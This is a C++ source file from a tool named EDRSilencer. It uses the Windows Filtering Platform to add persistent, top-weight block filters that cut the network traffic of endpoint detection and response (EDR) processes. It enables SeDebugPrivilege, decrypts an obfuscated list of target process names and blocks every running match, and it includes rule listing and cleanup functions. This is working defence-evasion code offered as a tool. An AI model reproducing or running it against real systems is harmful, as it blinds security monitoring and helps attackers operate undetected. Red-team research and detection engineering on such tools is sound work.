#include "core.hpp"
#include "errors.hpp"
#include <strsafe.h>
#include <vector>
#include <memory>
#include <string>
#include <string_view>
#include "HandleWrapper.hpp"
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Fwpuclnt.lib")

namespace EDRSilencer {



    // Helper prototypes
    static DWORD AddProviderAndSubLayer(HANDLE hEngine);
    static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
    static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);

    void configureNetworkFilters() {
        if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }

        HANDLE hEngine = NULL;
        if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
        if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }

        std::vector<std::string> decryptedNames;
        decryptedNames.reserve(PROCESS_DATA_COUNT);
        for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
            decryptedNames.emplace_back(decryptString(processData[i]));
        }

        EDRSilencer::Handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if (snapshot.valid()) {
            PROCESSENTRY32W pe32{};
            pe32.dwSize = sizeof(PROCESSENTRY32W);
            if (Process32FirstW(snapshot.get(), &pe32)) {
                do {
                    for (const auto& name : decryptedNames) {
                        if (!name.empty()) {
                            std::wstring nameW(name.begin(), name.end());
                            if (lstrcmpiW(pe32.szExeFile, nameW.c_str()) == 0) {
                                PRINTF("[+] Found target process: %s\n", name.c_str());
                                WCHAR fullPath[MAX_PATH];
                                if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                                    ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
                                }
                            }
                        }
                    }
                } while (Process32NextW(snapshot.get(), &pe32));
            }
        }

        FwpmEngineClose0(hEngine);
    }

    void addProcessRule(std::string_view processPath) {
        if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
        HANDLE hEngine = NULL;
        if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
        if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }

        std::wstring processPathW(processPath.begin(), processPath.end());
        ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, processPathW.c_str());

        FwpmEngineClose0(hEngine);
    }

    static void DiagnoseSubLayerUsage(HANDLE hEngine, const GUID* subLayerGuid);

    static void DeleteFiltersByTemplate(HANDLE hEngine, FWPM_FILTER_ENUM_TEMPLATE0* enumTemplate, const char* context) {
        HANDLE enumHandle = NULL;
        DWORD result = FwpmFilterCreateEnumHandle0(hEngine, enumTemplate, &enumHandle);
        if (result != ERROR_SUCCESS) {
            return;
        }

        FWPM_FILTER0** filters = NULL;
        UINT32 numEntries = 0;
        result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            PRINTF("[+] Removing %u filter(s) based on %s...\n", numEntries, context);

            result = FwpmTransactionBegin0(hEngine, 0);
            if (result == ERROR_SUCCESS) {
                for (UINT32 i = 0; i < numEntries; i++) {
                    FwpmFilterDeleteById0(hEngine, filters[i]->filterId);
                }
                result = FwpmTransactionCommit0(hEngine);
                if (result != ERROR_SUCCESS) {
                    PrintDetailedError("Failed to commit filter deletion transaction", result);
                    FwpmTransactionAbort0(hEngine);
                }
            } else {
                PrintDetailedError("Failed to begin filter deletion transaction", result);
            }
            FwpmFreeMemory0(reinterpret_cast<void**>(&filters));
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    void removeAllRules(BOOL isForce) {
        HANDLE hEngine = NULL;
        DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmEngineOpen0 failed", result);
            return;
        }

        PRINTF("[+] Starting comprehensive cleanup...\n");
        if (isForce) {
            PRINTF("[!] Force mode enabled.\n");
        }

        FWPM_FILTER_ENUM_TEMPLATE0 providerTemplate{};
        GUID providerKeyLocal = ProviderGUID;
        providerTemplate.providerKey = &providerKeyLocal;
        DeleteFiltersByTemplate(hEngine, &providerTemplate, "provider key");

        FWPM_FILTER_ENUM_TEMPLATE0 subLayerTemplate{};
        // Enumerate all filters and delete those that belong to our sublayer.
        HANDLE enumHandle2 = NULL;
        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate2{};
        DWORD enumRes = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate2, &enumHandle2);
        if (enumRes == ERROR_SUCCESS) {
            FWPM_FILTER0** filters2 = NULL;
            UINT32 num2 = 0;
            enumRes = FwpmFilterEnum0(hEngine, enumHandle2, 0xFFFFFFFF, &filters2, &num2);
            if (enumRes == ERROR_SUCCESS && num2 > 0) {
                DWORD tRes = FwpmTransactionBegin0(hEngine, 0);
                if (tRes == ERROR_SUCCESS) {
                    for (UINT32 i = 0; i < num2; i++) {
                        if (IsEqualGUID(filters2[i]->subLayerKey, SubLayerGUID)) {
                            FwpmFilterDeleteById0(hEngine, filters2[i]->filterId);
                        }
                    }
                    tRes = FwpmTransactionCommit0(hEngine);
                    if (tRes != ERROR_SUCCESS) {
                        PrintDetailedError("Failed to commit sublayer filter deletion transaction", tRes);
                        FwpmTransactionAbort0(hEngine);
                    }
                } else {
                    PrintDetailedError("Failed to begin sublayer filter deletion transaction", tRes);
                }
                FwpmFreeMemory0(reinterpret_cast<void**>(&filters2));
            }
            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle2);
        }

        result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
        if (result == ERROR_SUCCESS) {
            PRINTF("[+] WFP sublayer removed successfully.\n");
        } else if (static_cast<long>(result) != FWP_E_SUBLAYER_NOT_FOUND) {
            PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result);
            DiagnoseSubLayerUsage(hEngine, &SubLayerGUID);
        }

        result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
        if (result == ERROR_SUCCESS) {
            PRINTF("[+] WFP provider removed successfully.\n");
        } else if (static_cast<long>(result) != FWP_E_PROVIDER_NOT_FOUND) {
            PrintDetailedError("FwpmProviderDeleteByKey0 failed", result);
        }

        FwpmEngineClose0(hEngine);
        PRINTF("[+] Cleanup complete.\n");
    }

    static void DiagnoseSubLayerUsage(HANDLE hEngine, const GUID* subLayerGuid) {
        PRINTF("[!] Running diagnostics to find filters still using the sublayer...\n");
        HANDLE enumHandle = NULL;
        FWPM_FILTER0** filters = NULL;
        UINT32 numEntries = 0;

        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate{};
        enumTemplate.enumType = FWP_FILTER_ENUM_OVERLAPPING;
        enumTemplate.actionMask = 0xFFFFFFFF;

        if (FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle) == ERROR_SUCCESS) {
            if (FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries) == ERROR_SUCCESS) {
                UINT32 found = 0;
                for (UINT32 i = 0; i < numEntries; i++) {
                    if (IsEqualGUID(filters[i]->subLayerKey, *subLayerGuid)) {
                        found++;
                        GUID providerGuidCopy = *filters[i]->providerKey;
                        RPC_CSTR uuidStr = nullptr;
                        if (UuidToStringA(&providerGuidCopy, &uuidStr) == RPC_S_OK && uuidStr) {
                            WPRINTF(L"    > Lingering Filter ID: %llu, Name: %s, Provider: %S\n",
                                    filters[i]->filterId,
                                    filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)",
                                    reinterpret_cast<const char*>(uuidStr));
                            RpcStringFreeA(&uuidStr);
                        } else {
                            WPRINTF(L"    > Lingering Filter ID: %llu, Name: %s, Provider: %S\n",
                                    filters[i]->filterId,
                                    filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)",
                                    "(unknown)");
                        }
                    }
                }
                if (found == 0) {
                    PRINTF("[!] Diagnostics found no filters using the sublayer. The issue may be external or a race condition.\n");
                }
                FwpmFreeMemory0(reinterpret_cast<void**>(&filters));
            }
            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
        }
    }

    static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
        FWP_BYTE_BLOB* appId = NULL;
        if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CustomErrorCode::CUSTOM_SUCCESS) { return; }
        BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId, EDR_FILTER_NAME);
        if (ipv4Exists) {
            WPRINTF(L"    [!] Generic block filter for %s already exists. Skipping.\n", fullPath);
            FreeAppId(appId);
            return;
        }

        DWORD result = FwpmTransactionBegin0(hEngine, 0);
        if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionBegin0 failed", result); FreeAppId(appId); return; }

        UINT64 maxFilterWeight = (UINT64)-1;

        FWPM_FILTER0 blockFilter{};
        GUID providerKeyLocal2 = ProviderGUID;
        blockFilter.providerKey = &providerKeyLocal2;
        blockFilter.subLayerKey = *subLayerGuid;
        blockFilter.action.type = FWP_ACTION_BLOCK;
        std::wstring filterName(EDR_FILTER_NAME);
        blockFilter.displayData.name = filterName.data();
        blockFilter.weight.type = FWP_UINT64;
        blockFilter.weight.uint64 = &maxFilterWeight;

        FWPM_FILTER_CONDITION0 condition{};
        blockFilter.filterCondition = &condition;
        blockFilter.numFilterConditions = 1;
        condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
        condition.matchType = FWP_MATCH_EQUAL;
        condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
        condition.conditionValue.byteBlob = appId;

        UINT64 filterId = 0;
        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId); }

        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
        if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId); }

        result = FwpmTransactionCommit0(hEngine);
        if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
        FreeAppId(appId);
    }

    static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
        DWORD result = FwpmTransactionBegin0(hEngine, 0);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmTransactionBegin0 failed", result);
            return result;
        }

        FWPM_PROVIDER0 provider{};
        provider.providerKey = ProviderGUID;
        std::wstring providerName(EDR_PROVIDER_NAME);
        std::wstring providerDesc(EDR_PROVIDER_DESCRIPTION);
        provider.displayData.name = providerName.data();
        provider.displayData.description = providerDesc.data();
        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
        result = FwpmProviderAdd0(hEngine, &provider, NULL);
        if (result != ERROR_SUCCESS && static_cast<long>(result) != FWP_E_ALREADY_EXISTS) {
            PrintDetailedError("FwpmProviderAdd0 failed", result);
            FwpmTransactionAbort0(hEngine);
            return result;
        }

        FWPM_SUBLAYER0 subLayer{};
        subLayer.subLayerKey = SubLayerGUID;
        std::wstring sublayerName(EDR_SUBLAYER_NAME);
        std::wstring sublayerDesc(EDR_SUBLAYER_DESCRIPTION);
        subLayer.displayData.name = sublayerName.data();
        subLayer.displayData.description = sublayerDesc.data();
        GUID providerKeyLocal3 = ProviderGUID;
        subLayer.providerKey = &providerKeyLocal3;
        subLayer.weight = 0xFFFF;
        subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
        result = FwpmSubLayerAdd0(hEngine, &subLayer, NULL);
        if (result != ERROR_SUCCESS && static_cast<long>(result) != FWP_E_ALREADY_EXISTS) {
            PrintDetailedError("FwpmSubLayerAdd0 failed", result);
            FwpmTransactionAbort0(hEngine);
            return result;
        }

        result = FwpmTransactionCommit0(hEngine);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmTransactionCommit0 failed", result);
        }

        return result;
    }

    static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
        FWP_BYTE_BLOB* appId = NULL;
        if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CustomErrorCode::CUSTOM_SUCCESS) {
            PrintDetailedError("Failed to get AppID for process to remove", 0);
            return;
        }

        const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, &FWPM_LAYER_OUTBOUND_TRANSPORT_V4, &FWPM_LAYER_OUTBOUND_TRANSPORT_V6 };
        UINT totalRemoved = 0;

        FWPM_FILTER_CONDITION0 condition{};
        condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
        condition.matchType = FWP_MATCH_EQUAL;
        condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
        condition.conditionValue.byteBlob = appId;

        for (int i = 0; i < 4; ++i) {
            HANDLE enumHandle = NULL;
            FWPM_FILTER0** ppFilters = NULL;
            UINT32 numEntries = 0;

            FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate{};
            GUID providerGuidLocal4 = ProviderGUID;
            enumTemplate.providerKey = &providerGuidLocal4;
            enumTemplate.layerKey = *layers[i];
            enumTemplate.numFilterConditions = 1;
            enumTemplate.filterCondition = &condition;

            if (FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle) == ERROR_SUCCESS) {
                if (FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries) == ERROR_SUCCESS && numEntries > 0) {
                    for (UINT32 j = 0; j < numEntries; j++) {
                        if (FwpmFilterDeleteById0(hEngine, ppFilters[j]->filterId) == ERROR_SUCCESS) {
                            totalRemoved++;
                        }
                    }
                    FwpmFreeMemory0(reinterpret_cast<void**>(&ppFilters));
                }
                FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            }
        }

        if (totalRemoved > 0) {
            WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
        } else {
            WPRINTF(L"[!] No matching rules found for %s\n", fullPath);
        }

        FreeAppId(appId);
    }

    void listRules() {
        HANDLE hEngine = NULL;
        DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmEngineOpen0 failed", result);
            return;
        }

        FWPM_PROVIDER0* provider = NULL;
        result = FwpmProviderGetByKey0(hEngine, &ProviderGUID, &provider);
        if (static_cast<long>(result) == FWP_E_PROVIDER_NOT_FOUND) {
            PRINTF("[+] Provider '%ls' not found. No rules have been added by this tool yet.\n", EDR_PROVIDER_NAME);
            FwpmEngineClose0(hEngine);
            return;
        }
        if (provider) {
            FwpmFreeMemory0(reinterpret_cast<void**>(&provider));
        }

        HANDLE enumHandle = NULL;
        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate{};
        GUID providerGuidLocal5 = ProviderGUID;
        enumTemplate.providerKey = &providerGuidLocal5;

        result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
        if (result == static_cast<DWORD>(FWP_E_NEVER_MATCH)) {
            PRINTF("[+] No active filters found for provider '%ls'.\n", EDR_PROVIDER_NAME);
            FwpmEngineClose0(hEngine);
            return;
        } else if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmFilterCreateEnumHandle0 failed", result);
            FwpmEngineClose0(hEngine);
            return;
        }

        FWPM_FILTER0** filters = NULL;
        UINT32 numEntries = 0;
        result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmFilterEnum0 failed", result);
            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
            FwpmEngineClose0(hEngine);
            return;
        }

        PRINTF("[+] Found %u filter(s) for provider.\n", numEntries);
        for (UINT32 i = 0; i < numEntries; i++) {
            UINT64 id = filters[i]->filterId;
            const wchar_t* name = filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)";
            const wchar_t* description = filters[i]->displayData.description ? filters[i]->displayData.description : L"(no description)";
            const wchar_t* layer = LayerGuidToString(&filters[i]->layerKey);
            const char* action = (filters[i]->action.type == FWP_ACTION_BLOCK) ? "Block" : "Permit";

            WPRINTF(L"  Filter ID: %llu\n", id);
            WPRINTF(L"    Name: %s\n", name);
            WPRINTF(L"    Desc: %s\n", description);
            WPRINTF(L"    Action: %S\n", action);
            WPRINTF(L"    Layer: %s\n\n", layer);
        }

        if (filters) {
            FwpmFreeMemory0(reinterpret_cast<void**>(&filters));
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
        FwpmEngineClose0(hEngine);
    }

    void removeRulesByPath(std::string_view processPath) {
        if (!EnableSeDebugPrivilege()) {
            EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
            return;
        }

        std::wstring wProcessPath(processPath.begin(), processPath.end());

        HANDLE hEngine = NULL;
        DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmEngineOpen0 failed", result);
            return;
        }

        std::string processPathStr(processPath);
        PRINTF("[+] Attempting to remove all filters for process: %s\n", processPathStr.c_str());
        RemoveFiltersForProcess(hEngine, wProcessPath.c_str());

        FwpmEngineClose0(hEngine);
    }

    void removeRuleById(UINT64 ruleId) {
        HANDLE hEngine = NULL;
        DWORD result = 0;

        result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
        if (result != ERROR_SUCCESS) {
            PrintDetailedError("FwpmEngineOpen0 failed", result);
            return;
        }

        result = FwpmFilterDeleteById0(hEngine, ruleId);
        if (result == ERROR_SUCCESS) {
            PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
        } else {
            char contextBuffer[128];
            StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
            PrintDetailedError(contextBuffer, result);
        }

        FwpmEngineClose0(hEngine);
    }
}